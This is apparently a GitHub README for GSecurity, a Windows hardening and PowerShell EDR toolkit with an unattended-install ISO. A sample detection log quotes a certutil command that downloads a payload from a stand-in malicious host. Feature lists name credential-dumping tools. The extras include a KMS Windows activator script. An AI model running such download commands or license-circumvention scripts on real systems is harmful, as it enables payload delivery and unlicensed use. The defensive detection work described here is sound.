<div align="center">

# 🛡️ GSecurity

### Enterprise-Grade Windows Security Hardening & Automated Installation Toolkit

[![Version](https://img.shields.io/badge/version-6.0.0-blue.svg)](https://github.com/yourusername/gsecurity)
[![Windows](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey.svg)](https://www.microsoft.com/windows)
[![PowerShell](https://img.shields.io/badge/PowerShell-5.1+-blue.svg)](https://github.com/PowerShell/PowerShell)
[![License](https://img.shields.io/badge/license-MIT-orange.svg)](LICENSE)

*Comprehensive Windows security hardening, automated installation, and advanced threat detection system*

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Components](#-components) • [Structure](#-structure) • [Security](#-security-considerations)

</div>

---

## 📋 Overview

**GSecurity** is a production-ready Windows security hardening framework that provides automated system lockdown, advanced threat detection, and an unattended Windows installation ISO. The toolkit combines BIOS hardening, network security, service lockdown, browser policies, and a comprehensive EDR (Endpoint Detection and Response) system.

### Key Capabilities

- 🔍 **Advanced EDR System** - 42+ detection modules with real-time threat monitoring
- 🚫 **System Hardening** - BIOS tweaks, service lockdown, and privilege restrictions
- 🌐 **Network Security** - DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) configuration
- 🧬 **Multi-vector Detection** - Hash-based, entropy analysis, behavioral analysis, and signature detection
- 🌍 **Browser Security** - Automated installation of privacy extensions across multiple browsers
- 📦 **Automated Installation** - Unattended Windows installation with pre-configured security
- 🔐 **Credential Protection** - Detects credential dumping, keyloggers, and memory access attempts

---

## ✨ Features

### Core Security Components

| Component | Description | Status |
|-----------|-------------|--------|
| **EDR Engine** | 42+ detection modules with managed tick jobs | ✅ Active |
| **Hash Detection** | MD5/SHA256 signature matching with entropy analysis | ✅ Active |
| **LOLBin Detection** | Monitors certutil, mshta, regsvr32, wmic abuse | ✅ Active |
| **Credential Dumping** | Detects mimikatz, procdump, lsass access attempts | ✅ Active |
| **Ransomware Protection** | Behavioral analysis for rapid encryption patterns | ✅ Active |
| **Process Anomaly Detection** | Identifies suspicious process injection & hollowing | ✅ Active |
| **Network Monitoring** | DNS exfiltration, named pipes, and anomaly detection | ✅ Active |
| **Registry Persistence** | Scans Run keys, WMI, scheduled tasks for persistence | ✅ Active |
| **Fileless Malware** | Detects memory-only attacks and script-based threats | ✅ Active |
| **Browser Extension Monitoring** | Tracks malicious browser extensions | ✅ Active |

### System Hardening Features

- **BIOS/Boot Configuration**: Configures DEP, hypervisor settings, and boot parameters via `bcdedit`
- **Service Lockdown**: Automatically disables risky services (VNC, TeamViewer, Telnet, FTP, WinRM, SMB, SSH, etc.)
- **Network Security**: Forces DNS-over-HTTPS with Cloudflare (1.1.1.1) and Google (8.8.8.8)
- **Permission Hardening**: Restricts UAC, file system permissions, and removes default users
- **Certificate Management**: Removes untrusted/compromised root certificates from the system store
- **Browser Policies**: Enforces extension installations and privacy settings across Chrome, Firefox, Edge, Brave, Vivaldi, Arc, and Zen

### Installation Features

- **Unattended Installation**: Automated Windows setup with `AutoUnattend.xml`
- **Auto-login Configuration**: Pre-configured user account setup
- **Post-Install Scripts**: Automatic execution of security hardening on first boot
- **Extras Package**: Includes activator, browser installer, bookmarks, and Microsoft Store restoration

---

## 🚀 Installation

### Prerequisites

- **Windows 10/11** (64-bit) installation media
- **PowerShell 5.1+** with Administrator privileges
- **.NET Framework 4.7.2+**
- **ISO Creation Tool** (for building the installation ISO)

### Method 1: ISO Installation (Recommended)

1. **Prepare the ISO Structure**
   ```powershell
   # Copy Windows installation files to Iso\sources\
   # Place your Windows ISO contents in the Iso directory
   ```

2. **Customize AutoUnattend.xml**
   ```xml
   <!-- Edit AutoUnattend.xml to set your product key and preferences -->
   <ProductKey>
       <Key>[YOUR_KEY]</Key>
   </ProductKey>
   ```

3. **Build the ISO**
   ```powershell
   # Use your preferred ISO creation tool (Oscdimg, ImgBurn, etc.)
   # Include all files from the Iso directory
   ```

4. **Install Windows**
   - Boot from the created ISO
   - Installation will proceed automatically
   - Security scripts will execute on first logon

### Method 2: Manual Installation on Existing System

1. **Download/Clone the Repository**
   ```powershell
   git clone https://github.com/yourusername/gsecurity.git
   cd gsecurity
   ```

2. **Run SetupComplete.cmd**
   ```cmd
   # Navigate to the scripts directory
   cd Iso\sources\$OEM$\$$\Setup\Scripts
   
   # Run as Administrator
   SetupComplete.cmd
   ```

   The installer will:
   - Elevate privileges automatically
   - Execute PowerShell scripts (`.ps1`) alphabetically
   - Execute Registry files (`.reg`) alphabetically
   - Apply all security configurations
   - Restart the system (if configured)

3. **Manual Component Installation**
   ```powershell
   # Navigate to Bin directory
   cd Bin
   
   # Execute individual components
   powershell.exe -ExecutionPolicy Bypass -File Antivirus.ps1
   GSecurity.bat
   reg import GSecurity.reg
   ```

---

## 📦 Components

### 1. **SetupComplete.cmd** (Main Orchestrator)
- Automatically elevates privileges
- Executes all scripts in alphabetical order (`.ps1` → `.reg`)
- Coordinates installation flow
- Runs PowerShell scripts in hidden mode

### 2. **Antivirus.ps1** (EDR Engine)
**3,396+ lines of production PowerShell**

Key Detection Modules:
- `Invoke-HashScan`: MD5/SHA256 scanning with entropy analysis
- `Invoke-LOLBinDetection`: Monitors certutil, mshta, regsvr32, wmic, rundll32 abuse
- `Invoke-CredentialDumpScan`: Detects lsass.exe access, mimikatz, procdump
- `Invoke-RansomwareDetection`: Monitors rapid file encryption patterns
- `Invoke-ProcessAnomalyScan`: Identifies code injection, process hollowing
- `Invoke-NetworkAnomalyScan`: DNS tunneling, named pipes, suspicious connections
- `Invoke-RegistryPersistenceDetection`: Scans Run keys, WMI, scheduled tasks
- `Invoke-FilelessDetection`: Detects memory-only and script-based malware
- `Invoke-KeyloggerScan`: Monitors keyboard hooking and input capture
- `Invoke-BrowserExtensionMonitoring`: Tracks malicious browser extensions
- And 32+ more detection modules...

**Auto-Actions**:
- Quarantine threats to `C:\ProgramData\Antivirus\Quarantine`
- Terminate malicious processes with retry logic (max 5 attempts)
- Log to Windows Event Log + file system
- Cache file hashes for performance
- Managed tick jobs with configurable intervals

### 3. **GSecurity.bat** (System Hardening)
```cmd
# BIOS/Boot Configuration
bcdedit /set nx AlwaysOn                    # Enable DEP
netsh dns add global dot=yes                # Enable DNS-over-TLS

# Permission Hardening
takeown /f %windir%\System32\Oobe\useroobe.dll /A
icacls %windir%\System32\Oobe\useroobe.dll /reset
icacls "%systemdrive%\Users" /remove "Everyone"

# Service Disabling
sc config VNC start= disabled
sc config TeamViewer start= disabled
sc config WinRM start= disabled
sc config LanmanServer start= disabled
# ... and 20+ more services

# User Cleanup
net user defaultuser0 /delete

# UAC Configuration
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "5" /f
```

### 4. **GSecurity.reg** (Browser Policies & Certificates)
- **Browser Extensions** (forced install via Group Policy):
  - uBlock Origin (`cjpalhdlnbpafiamejdnhcphjbkeiagm`)
  - Return YouTube Dislike (`gebbhagfogifgggkldgodflihgfeippi`)
  - I Don't Care About Cookies (`jid1-KKzOGWgsW3Ao4Q@jetpack`)
  - Cently Coupons (`cently@couponfollow.com`)
  - Cookie AutoDelete (`jfnangjojcioomickmmnfmiadkfhcdmd`)
  
- **Certificate Removal**: Untrusted roots and compromised CAs
- **Browser Policy Enforcement**: Applies to Chrome, Firefox, Edge, Brave, Vivaldi, Arc, Zen

### 5. **AutoUnattend.xml** (Unattended Installation)
- Automated Windows installation configuration
- Pre-configured user account (Admin)
- Timezone and locale settings (Croatian/English)
- First logon command execution
- OEM information customization
- Network location configuration

### 6. **Extras Package**
Located in `Iso\sources\$OEM$\$1\users\Default\Desktop\Extras\`:

- **Activator/Activator.cmd**: Windows activation script with KMS support for all Windows editions
- **Browser/BraveBrowserSetup-BRV010.exe**: Brave browser installer
- **Bookmarks/bookmarks.html**: Pre-configured browser bookmarks
- **Store/Store.cmd**: Microsoft Store restoration script

---

## ⚙️ Configuration

### Antivirus Engine Settings

Edit `Antivirus.ps1` configuration block:

```powershell
$script:ModuleDefinitions = @{
    "HashDetection"                = @{ TickInterval = 60;  Priority = 16; Function = "Invoke-HashScan" }
    "CredentialDumpDetection"      = @{ TickInterval = 20;  Priority = 7;  Function = "Invoke-CredentialDumpScan" }
    "RansomwareDetection"           = @{ TickInterval = 15;  Priority = 8;  Function = "Invoke-RansomwareDetection" }
    # ... adjust intervals as needed
}

$Config = @{
    LogPath = "$env:ProgramData\Antivirus\Logs"
    QuarantinePath = "$env:ProgramData\Antivirus\Quarantine"
    DatabasePath = "$env:ProgramData\Antivirus\Data"
    MaxTerminationAttempts = 5
}
```

### Network Configuration

DNS-over-HTTPS is configured automatically via `GSecurity.bat`. To verify:

```cmd
# Check DNS configuration
netsh interface ipv4 show dnsservers

# Verify DoH settings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters"
```

### Unattended Installation Customization

Edit `AutoUnattend.xml`:

```xml
<!-- Set your product key -->
<ProductKey>
    <Key>[YOUR_PRODUCT_KEY]</Key>
</ProductKey>

<!-- Customize user account -->
<LocalAccount>
    <Name>YourUsername</Name>
    <Password>
        <Value>YourPassword</Value>
    </Password>
</LocalAccount>

<!-- Change timezone -->
<TimeZone>YourTimeZone</TimeZone>
```

---

## 🔍 Usage

### Running the Antivirus EDR

```powershell
# Start protection (runs automatically via Task Scheduler)
powershell.exe -ExecutionPolicy Bypass -File "C:\ProgramData\Antivirus\Antivirus.ps1"

# Start with auto-start flag
powershell.exe -ExecutionPolicy Bypass -File "Antivirus.ps1" -AutoStart

# Uninstall
powershell.exe -ExecutionPolicy Bypass -File Antivirus.ps1 -Uninstall
```

### Checking Status

```powershell
# View logs
Get-Content "C:\ProgramData\Antivirus\Logs\stability_log.txt" -Tail 50

# Check quarantine
Get-ChildItem "C:\ProgramData\Antivirus\Quarantine"

# View Windows Event Logs
Get-EventLog -LogName Application -Source "AntivirusEDR" -Newest 20

# Check running processes
Get-Process | Where-Object {$_.ProcessName -like "*antivirus*"}
```

### Network Verification

```cmd
# Verify DNS-over-HTTPS
netsh dns show global

# Check DoT status
netsh dns show global dot

# List network adapters
netsh interface show interface
```

### Service Status

```powershell
# Check disabled services
Get-Service | Where-Object {$_.StartType -eq 'Disabled'} | Select-Object Name, Status, StartType

# Verify specific service
Get-Service -Name "TeamViewer" | Select-Object Name, Status, StartType
```

---

## 🗂️ Directory Structure

```
GSecurity-main/
├── Iso/
│   ├── Autorun.ico                    # ISO autorun icon
│   ├── Autorun.inf                    # ISO autorun configuration
│   ├── AutoUnattend.xml               # Unattended installation config
│   └── sources/
│       ├── $OEM$/
│       │   ├── $$/
│       │   │   └── Setup/
│       │   │       └── Scripts/
│       │   │           ├── SetupComplete.cmd    # Main installer
│       │   │           └── Bin/
│       │   │               ├── Antivirus.ps1    # EDR engine (3,396 lines)
│       │   │               ├── GSecurity.bat    # System hardening
│       │   │               └── GSecurity.reg    # Browser policies (9,173 lines)
│       │   └── $1/
│       │       ├── autoexec.bat
│       │       ├── config.sys
│       │       └── users/
│       │           └── Default/
│       │               └── Desktop/
│       │                   └── Extras/
│       │                       ├── Activator/
│       │                       │   └── Activator.cmd
│       │                       ├── Bookmarks/
│       │                       │   └── bookmarks.html
│       │                       ├── Browser/
│       │                       │   └── BraveBrowserSetup-BRV010.exe
│       │                       └── Store/
│       │                           └── Store.cmd
│       └── [Windows installation files]
└── README.md

Runtime Directories (created during installation):
C:\Windows\Setup\Scripts\
└── Bin\                              # Scripts copied here

C:\ProgramData\Antivirus\
├── Data\
│   ├── database.json                 # Threat database
│   ├── whitelist.json               # Approved processes
│   ├── scanned_files.txt            # Hash cache
│   └── antivirus.pid                # Process ID
├── Logs\
│   ├── stability_log.txt            # Main log
│   └── behavior_detections.log       # Threat log
└── Quarantine\                      # Isolated threats
```

---

## 🛡️ Security Considerations

### ⚠️ Important Warnings

1. **Service Disruption**: This toolkit disables critical remote access services (RDP alternatives, file servers, remote registry, SMB, WinRM). Ensure you have local/physical access before deployment.

2. **Certificate Removal**: Removes untrusted root certificates. May break applications/websites that rely on specific CAs. Test thoroughly before production use.

3. **Browser Control**: Enforces mandatory extension installation via Group Policy. Users cannot disable or remove policy-managed extensions.

4. **Performance Impact**: Real-time scanning with multiple detection modules may impact system performance on low-end hardware. Adjust tick intervals as needed.

5. **Auto-login Security**: The default `AutoUnattend.xml` includes auto-login configuration. Change or remove this for production deployments.

6. **Administrative Access**: All scripts require Administrator privileges. Review all scripts before execution.

### Recommended Use Cases

✅ **Good for:**
- Personal workstations
- Gaming PCs
- Isolated systems
- Privacy-focused setups
- Security research labs
- Development environments
- Systems requiring maximum security lockdown

❌ **Not recommended for:**
- Enterprise domain-joined systems (may conflict with Group Policy)
- Servers requiring remote administration
- Systems with custom CA certificates
- Virtualization hosts (Hyper-V, VMware Workstation) - BIOS tweaks may interfere
- Production servers without thorough testing
- Systems requiring specific disabled services

---

## 📊 Threat Detection Examples

### Hash Detection
```
[2025-01-15 14:32:15] [THREAT] CRITICAL: Known malware detected
File: C:\Users\Admin\Downloads\malware.exe
MD5: 44D88612FEA8A8F36DE82E1278ABB02F
SHA256: 275A021BBFB6489E54D471899F7DB9D1663FC695EC2FE2A2C4538AABF651FD0F
Action: Quarantined
```

### LOLBin Detection
```
[2025-01-15 14:35:42] [THREAT] Detected LOLBin abuse
Process: certutil.exe (PID: 5432)
Command: certutil.exe -urlcache -split -f http://malicious.com/payload.exe
Severity: HIGH
Action: Process terminated
```

### Credential Dumping Detection
```
[2025-01-15 14:40:18] [THREAT] Credential dumping attempt detected
Process: suspicious.exe (PID: 7821)
Behavior: Access to lsass.exe memory
Action: Process terminated, logged to Event Viewer
```

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

### Development Guidelines

- PowerShell scripts must follow best practices and pass `PSScriptAnalyzer`
- Test on clean Windows 10/11 VM before submitting
- Update documentation for new features
- Follow existing code style and conventions
- Add comments for complex logic
- Ensure all scripts handle errors gracefully

---

## 📝 Changelog

### v6.0.0 (Current)
- ✨ Complete EDR engine rewrite with 42+ detection modules
- 🔐 Added DNS-over-HTTPS and DNS-over-TLS support
- 🌐 Expanded browser policy support (Arc, Zen, Vivaldi)
- 🛡️ Enhanced LOLBin detection with multiple patterns
- 📊 Added comprehensive event logging
- ⚡ Implemented managed tick jobs for efficient resource usage
- 🎯 Process termination retry logic with max attempts
- 📦 Unattended installation support with AutoUnattend.xml
- 🔧 Extras package with activator, browser installer, and utilities

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 👤 Author

**Gorstak**

- GitHub: [@gorstak](https://github.com/ads-blocker)
- Support: [Discord](https://discord.gg/65sZs7aJQP)
- Last Updated: 2025

---

## ⚖️ Legal Disclaimer

This software is provided for **educational and security research purposes only**. By using GSecurity, you agree to:

- Use it only on systems you own or have explicit written permission to modify
- Comply with all applicable laws and regulations in your jurisdiction
- Accept full responsibility for any consequences arising from its use
- Understand that the authors are not liable for any damages, data loss, or legal issues
- Not use this software for any illegal activities

**DO NOT USE ON PRODUCTION SYSTEMS WITHOUT THOROUGH TESTING IN A CONTROLLED ENVIRONMENT.**

**The activator script is provided for educational purposes. Ensure you have a valid Windows license for production use.**

---

## 🙏 Acknowledgments

- Windows Defender team for EDR design inspiration
- MITRE ATT&CK framework for threat detection patterns
- uBlock Origin and privacy extension developers
- PowerShell community for best practices
- All contributors and testers

---

<div align="center">

**⭐ If you find this project useful, please consider giving it a star!**

[Report Bug](https://github.com/yourusername/gsecurity/issues) • [Request Feature](https://github.com/yourusername/gsecurity/issues) • [Documentation](https://github.com/yourusername/gsecurity/wiki)

Made with ❤️ for the security community

</div>
